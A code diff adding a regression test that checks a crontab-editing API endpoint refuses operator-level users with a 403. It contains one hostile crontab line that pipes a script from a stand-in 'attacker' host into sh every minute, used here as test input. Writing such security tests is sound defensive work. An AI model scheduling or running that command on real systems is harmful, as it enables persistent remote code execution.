@@ -73,6 +73,25 @@ async def test_cron_replace_rejects_unauthenticated_request():
 
 
 @pytest.mark.asyncio
+async def test_cron_replace_rejects_operator_arbitrary_command():
+    """RCE regression: PUT /api/cron is a raw crontab editor (arbitrary command
+
+    scheduling). It must be admin-only — an operator-scoped identity, even with
+    a valid CSRF/session, must be denied before the handler (and therefore
+    _write_crontab) ever runs.
+    """
+    async with await _client() as client:
+        response = await client.put(
+            "/api/cron",
+            json={"content": "* * * * * curl http://attacker/x | sh"},
+            headers=_headers("huntable-operators"),
+        )
+
+    assert response.status_code == 403
+    assert response.json()["detail"] == "Insufficient role"
+
+
+@pytest.mark.asyncio
 async def test_source_collect_rejects_unauthenticated_request():
     async with await _client() as client:
         response = await client.post("/api/sources/1/collect")
